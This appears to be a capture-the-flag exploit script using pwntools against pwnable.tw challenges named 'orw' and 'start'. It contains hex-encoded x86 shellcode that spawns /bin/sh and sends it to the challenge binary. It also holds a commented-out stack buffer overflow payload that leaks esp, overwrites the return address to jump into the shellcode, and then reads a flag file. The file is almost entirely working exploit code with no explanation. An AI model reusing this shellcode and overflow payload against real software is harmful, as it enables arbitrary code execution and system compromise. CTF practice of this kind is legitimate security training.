# import socket
from struct import pack, unpack
from binascii import unhexlify
from pwn import *
# Got it via `ragg2 -i exec -b 32`
shellcode = unhexlify('31c050682f2f7368682f62696e89e3505389e199b00b31d2cd80')
# shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
# shellcode = asm.shellcode()
conn=process("./orw")
gdb.attach(conn,'b *0x804858A\nc')
# sck = remote("chall.pwnable.tw","10000")
#sck = socket.create_connection(('0.0.0.0', 8080))
print conn.recv()
conn.send(shellcode)
conn.interactive()

# _ = sck.recv(4096)
# sck.send(b'\x90' * 20 + pack('<I', 0x08048087))
# esp, = unpack('<I', sck.recv(4096)[:4])
# print hex(esp)
# # print(f"*** Setting retaddr={hex(esp+20)}")
# payload = "A"*20+pack('<I', esp+20)  + shellcode
# assert len(payload) <= 60, "You can't inject more than 60-bytes."
# sck.send(payload)
# sck.send(b'cat /home/start/flag\n')
# print sck.recv(4096)
